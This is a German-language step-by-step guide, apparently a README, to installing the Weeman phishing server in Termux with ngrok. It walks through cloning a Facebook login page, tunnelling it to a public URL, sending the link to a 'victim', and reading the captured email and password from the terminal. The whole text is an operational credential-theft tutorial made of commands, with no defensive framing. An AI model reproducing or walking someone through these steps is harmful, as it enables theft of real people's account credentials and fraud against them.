# Weeman - http server for phishing

# Zuerst "ngrok"

SCHRITT FÜR SCHRITT "WEEMAN" IN TERMUX INSTALLIEREN :-
Teilen Sie Ihre Links über das Internet und schappen Sie sich die Login-daten
 --> installieren NGROK im vorraus

-gehe per Browser auf https://ngrok.com/download und lade die "Linux ARM" Zip

-in Termux nutzen wir jetzt folgende Befehle:

1. cd /sdcard/download
2. unzip ngrok.zip
3. cp ngrok $HOME
4. cd $HOME
5. ls
6. chmod 777 ngrok
7. ./ngrok
8. ./ngrok authtoken 844ZM.... [kopiere den Orginal Code der dir angezeigt wird, sobald du dich eingelogt hast]

 zu 8.: dieser schritt ist nicht unbedingt notwendig

# Installieren

TIPPE


  apt update && apt upgrade

dann TIPPE


  pkg install git

kopieren den folgenden Link


  git clone https://github.com/GottModusTermux/G0D

  ls

  cd G0D/weeman

  pkg install python2

  ls

  python2 weeman.py
  
# Ausführen

nach dem Start folgende befehle

-Befehl 1 

  set url yoursite.com

-Befehl 2 

  set port 8080

-Befehl 3 

  set action_url yoursite.com
  
-Befehl 4

  run
  
Nun öffnet ihr einen Browser und sucht
LOCALHOST:8080 oder 127.0.0.1:8080.

# ERÖFFNE EINE FACEBOOK-PHISHING SEITE.

-TIPPE

  cd G0D/weeman

  python2 weeman.py

  set url https://www.facebook.com/

  set port 8080

  set action_url https://www.facebook.com/

  run

Jetzt können Sie Ihre Facebook-Phishing Seite einfach per Ngrok an Ihr Opfer weiterleiten...

-Neues Termux Fenster öffnen

-gehe zum Ordner wo NGROK vorhanden ist
(hier im ordner G0D.... )
cd G0D

./ngrok http 8080

Oben rechts den unteren Link kopieren, und nun verschicken
Beispiel:
"https://denLinkKopieren.ngrok.io -> localhost:8080

sobald das Opfer seine Login-Daten eingegeben hat, 
können Sie seine E-Mail-ID und sein Passwort in dem Termux Fenster "weeman" einsehen
(hochscrollen und "user: " | "pass: "suchen)

sobald "ngrok" beendet wird, ist der erstellte Link nicht mehr erreichbar !! 


HTTP server for phishing in python.
Version 1.7.1 is the last and latest version for weeman.
